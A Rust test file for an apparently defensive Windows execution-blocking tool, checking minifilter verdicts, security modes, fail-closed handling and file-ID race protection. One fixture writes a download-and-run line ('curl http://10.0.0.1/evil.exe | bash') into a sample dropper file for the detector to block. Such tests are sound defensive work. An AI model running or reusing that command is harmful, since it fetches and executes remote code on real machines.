use kernlock_core::SecurityMode;
use kernlock_platform::{
    windows::{
        ExecutionRequestMessage, ExecutionVerdict, MinifilterClient, MinifilterMessageHeader,
        WindowsSecurityProvider, FILTER_PORT_NAME, FLT_PREOP_COMPLETE,
        FLT_PREOP_SUCCESS_NO_CALLBACK, KERNLOCK_FILTER_ALTITUDE, STATUS_ACCESS_DENIED,
        STATUS_SUCCESS,
    },
    PlatformSecurityProvider,
};

#[test]
fn test_windows_provider_never_claims_kernel_blocking_without_driver() {
    let provider = WindowsSecurityProvider::new();

    // In both Protection and Strict mode, when the driver is not connected,
    // capability probing must report kernel_blocking_available = false and fallback to Audit.
    for mode in [
        SecurityMode::Audit,
        SecurityMode::Protection,
        SecurityMode::Strict,
    ] {
        let caps = provider.probe_capabilities(mode);

        assert!(!caps.kernel_blocking_available);
        assert!(!caps.auto_quarantine_available);
        assert_eq!(caps.active_mode, SecurityMode::Audit);

        let fallback = caps
            .fallback_reason
            .expect("Fallback reason must be present");
        assert!(fallback.contains(FILTER_PORT_NAME));
        assert!(fallback.contains("kernlock_filter.sys"));
        assert!(fallback.contains("unavailable"));

        // Verify capability statuses
        let fltmgr_cap = caps
            .capabilities
            .iter()
            .find(|c| c.name.contains("FLTMGR"))
            .expect("FLTMGR capability status must exist");
        assert!(!fltmgr_cap.supported);
        assert!(!fltmgr_cap.enforcement_available);
        assert!(fltmgr_cap.active_mode.contains("Unavailable"));
    }
}

#[test]
fn test_windows_minifilter_verdict_evaluation() {
    let client = MinifilterClient::new();

    let request = ExecutionRequestMessage {
        header: MinifilterMessageHeader {
            message_id: 1001,
            process_id: 4242,
            thread_id: 8484,
            timestamp_qword: 133_000_000,
        },
        desired_access: 0x0000_0020, // FILE_EXECUTE
        file_path: "C:\\Windows\\Temp\\malicious.exe".to_string(),
        parent_process_id: 1000,
        sha256_hex: None,
    };

    // Protection mode + clean file -> Allow, STATUS_SUCCESS
    let clean_resp = client.evaluate_verdict(&request, SecurityMode::Protection, false);
    assert_eq!(clean_resp.message_id, 1001);
    assert_eq!(clean_resp.verdict, ExecutionVerdict::Allow);
    assert_eq!(clean_resp.ntstatus, STATUS_SUCCESS);

    // Protection mode + threat detected -> Block, STATUS_ACCESS_DENIED
    let threat_resp = client.evaluate_verdict(&request, SecurityMode::Protection, true);
    assert_eq!(threat_resp.message_id, 1001);
    assert_eq!(threat_resp.verdict, ExecutionVerdict::Block);
    assert_eq!(threat_resp.ntstatus, STATUS_ACCESS_DENIED);

    // Audit mode + threat detected -> Audit verdict, STATUS_SUCCESS
    let audit_resp = client.evaluate_verdict(&request, SecurityMode::Audit, true);
    assert_eq!(audit_resp.message_id, 1001);
    assert_eq!(audit_resp.verdict, ExecutionVerdict::Audit);
    assert_eq!(audit_resp.ntstatus, STATUS_SUCCESS);

    // Verify constants
    assert_eq!(KERNLOCK_FILTER_ALTITUDE, "325000");
    assert_eq!(FILTER_PORT_NAME, "\\KernLockFilterPort");
    assert_eq!(FLT_PREOP_SUCCESS_NO_CALLBACK, 1);
    assert_eq!(FLT_PREOP_COMPLETE, 3);
}

#[test]
fn test_raw_c_matching_minifilter_request_verdict_evaluation() {
    use kernlock_core::rules::RuleEngine;
    use kernlock_core::PolicyConfig;
    use kernlock_platform::windows::{RawExecutionRequestMsg, RawMinifilterMsgHeader};
    use std::io::Write;
    use std::sync::atomic::{AtomicUsize, Ordering};
    use std::sync::Arc;

    let tmp = tempfile::tempdir().unwrap();
    let mal_path = tmp.path().join("dropper.bat");
    let mut f = std::fs::File::create(&mal_path).unwrap();
    f.write_all(b"curl http://10.0.0.1/evil.exe | bash\n")
        .unwrap();
    f.sync_all().unwrap();

    let client = MinifilterClient::new();
    let rules = RuleEngine::builtin();
    let policy = PolicyConfig {
        mode: SecurityMode::Protection,
        ..Default::default()
    };

    let path_str = mal_path.to_string_lossy().to_string();
    let mut file_path_utf16 = [0u16; 1024];
    for (i, c) in path_str.encode_utf16().enumerate() {
        if i < 1023 {
            file_path_utf16[i] = c;
        }
    }

    let raw_req = RawExecutionRequestMsg {
        header: RawMinifilterMsgHeader {
            message_id: 5555,
            process_id: 1234,
            thread_id: 5678,
            timestamp: 999999,
        },
        desired_access: 0x0000_0020, // FILE_EXECUTE
        parent_process_id: 4,
        file_id: 0,
        file_path: file_path_utf16,
    };

    assert_eq!(raw_req.file_path_string(), path_str);

    let threat_count = Arc::new(AtomicUsize::new(0));
    let tc = threat_count.clone();
    let on_threat = move |_event: kernlock_core::SecurityEvent,
                          _alert: kernlock_core::ThreatAlert| {
        tc.fetch_add(1, Ordering::SeqCst);
    };

    let raw_resp = client.evaluate_request(&raw_req, &rules, &policy, &on_threat);
    let msg_id = raw_resp.message_id;
    let verdict = raw_resp.verdict;
    let ntstatus = raw_resp.ntstatus;
    assert_eq!(msg_id, 5555);
    assert_eq!(verdict, ExecutionVerdict::Block as u32);
    assert_eq!(ntstatus, STATUS_ACCESS_DENIED);
    assert_eq!(threat_count.load(Ordering::SeqCst), 1);

    // 2. Unreadable / non-existent file in Strict mode must fail-closed (Block / STATUS_ACCESS_DENIED)
    let non_existent_path = tmp.path().join("missing.exe");
    let non_existent_str = non_existent_path.to_string_lossy().to_string();
    let mut missing_path_utf16 = [0u16; 1024];
    for (i, c) in non_existent_str.encode_utf16().enumerate() {
        if i < 1023 {
            missing_path_utf16[i] = c;
        }
    }
    let missing_req = RawExecutionRequestMsg {
        header: RawMinifilterMsgHeader {
            message_id: 6666,
            process_id: 1234,
            thread_id: 5678,
            timestamp: 999999,
        },
        desired_access: 0x0000_0020,
        parent_process_id: 4,
        file_id: 0,
        file_path: missing_path_utf16,
    };

    let strict_policy = PolicyConfig {
        mode: SecurityMode::Strict,
        ..Default::default()
    };
    let missing_strict_resp =
        client.evaluate_request(&missing_req, &rules, &strict_policy, &on_threat);
    let missing_strict_verdict = missing_strict_resp.verdict;
    let missing_strict_ntstatus = missing_strict_resp.ntstatus;
    assert_eq!(missing_strict_verdict, ExecutionVerdict::Block as u32);
    assert_eq!(missing_strict_ntstatus, STATUS_ACCESS_DENIED);

    // 3. Unreadable / non-existent file in Protection mode must fail-open (Allow / STATUS_SUCCESS)
    let protection_policy = PolicyConfig {
        mode: SecurityMode::Protection,
        ..Default::default()
    };
    let missing_protection_resp =
        client.evaluate_request(&missing_req, &rules, &protection_policy, &on_threat);
    let missing_prot_verdict = missing_protection_resp.verdict;
    let missing_prot_ntstatus = missing_protection_resp.ntstatus;
    assert_eq!(missing_prot_verdict, ExecutionVerdict::Allow as u32);
    assert_eq!(missing_prot_ntstatus, STATUS_SUCCESS);
}

#[test]
fn test_windows_file_identity_safety_and_toctou_prevention() {
    use kernlock_core::rules::RuleEngine;
    use kernlock_core::PolicyConfig;
    use kernlock_platform::windows::{RawExecutionRequestMsg, RawMinifilterMsgHeader};
    use std::io::Write;
    use std::sync::atomic::{AtomicUsize, Ordering};
    use std::sync::Arc;

    let tmp = tempfile::tempdir().unwrap();
    let clean_path = tmp.path().join("benign_app.exe");
    let mut f = std::fs::File::create(&clean_path).unwrap();
    f.write_all(b"#!/bin/sh\necho hello\n").unwrap();
    f.sync_all().unwrap();

    let client = MinifilterClient::new();
    let rules = RuleEngine::builtin();
    let threat_count = Arc::new(AtomicUsize::new(0));
    let tc = threat_count.clone();
    let on_threat = move |_event: kernlock_core::SecurityEvent,
                          _alert: kernlock_core::ThreatAlert| {
        tc.fetch_add(1, Ordering::SeqCst);
    };

    let path_str = clean_path.to_string_lossy().to_string();
    let mut file_path_utf16 = [0u16; 1024];
    for (i, c) in path_str.encode_utf16().enumerate() {
        if i < 1023 {
            file_path_utf16[i] = c;
        }
    }

    // 1. In Strict mode, kernel file_id == 0 must fail closed (do not silently skip verification)
    let zero_file_id_req = RawExecutionRequestMsg {
        header: RawMinifilterMsgHeader {
            message_id: 7001,
            process_id: 1234,
            thread_id: 5678,
            timestamp: 999999,
        },
        desired_access: 0x0000_0020,
        parent_process_id: 4,
        file_id: 0,
        file_path: file_path_utf16,
    };
    let strict_policy = PolicyConfig {
        mode: SecurityMode::Strict,
        ..Default::default()
    };
    let zero_strict_resp =
        client.evaluate_request(&zero_file_id_req, &rules, &strict_policy, &on_threat);
    let zero_strict_verdict = zero_strict_resp.verdict;
    let zero_strict_ntstatus = zero_strict_resp.ntstatus;
    assert_eq!(
        zero_strict_verdict,
        ExecutionVerdict::Block as u32,
        "Strict mode must fail closed when FileId is zero"
    );
    assert_eq!(zero_strict_ntstatus, STATUS_ACCESS_DENIED);

    // 2. In Protection mode, kernel file_id == 0 logs a warning and evaluates clean executable
    let protection_policy = PolicyConfig {
        mode: SecurityMode::Protection,
        ..Default::default()
    };
    let zero_prot_resp =
        client.evaluate_request(&zero_file_id_req, &rules, &protection_policy, &on_threat);
    let zero_prot_verdict = zero_prot_resp.verdict;
    let zero_prot_ntstatus = zero_prot_resp.ntstatus;
    assert_eq!(
        zero_prot_verdict,
        ExecutionVerdict::Allow as u32,
        "Protection mode allows clean executable when FileId is zero (with audit warning)"
    );
    assert_eq!(zero_prot_ntstatus, STATUS_SUCCESS);

    // 3. TOCTOU race: opened file ID does not match kernel file ID -> must fail closed in all modes
    let mismatched_req = RawExecutionRequestMsg {
        header: RawMinifilterMsgHeader {
            message_id: 7002,
            process_id: 1234,
            thread_id: 5678,
            timestamp: 999999,
        },
        desired_access: 0x0000_0020,
        parent_process_id: 4,
        file_id: 0xDEAD_BEEF_CAFE_BABE, // definitely does not match actual file index/inode
        file_path: file_path_utf16,
    };
    let toctou_prot_resp =
        client.evaluate_request(&mismatched_req, &rules, &protection_policy, &on_threat);
    let toctou_prot_verdict = toctou_prot_resp.verdict;
    let toctou_prot_ntstatus = toctou_prot_resp.ntstatus;
    assert_eq!(
        toctou_prot_verdict,
        ExecutionVerdict::Block as u32,
        "Mismatched FileId (TOCTOU) must fail closed in Protection mode"
    );
    assert_eq!(toctou_prot_ntstatus, STATUS_ACCESS_DENIED);

    let toctou_strict_resp =
        client.evaluate_request(&mismatched_req, &rules, &strict_policy, &on_threat);
    let toctou_strict_verdict = toctou_strict_resp.verdict;
    let toctou_strict_ntstatus = toctou_strict_resp.ntstatus;
    assert_eq!(
        toctou_strict_verdict,
        ExecutionVerdict::Block as u32,
        "Mismatched FileId (TOCTOU) must fail closed in Strict mode"
    );
    assert_eq!(toctou_strict_ntstatus, STATUS_ACCESS_DENIED);
}
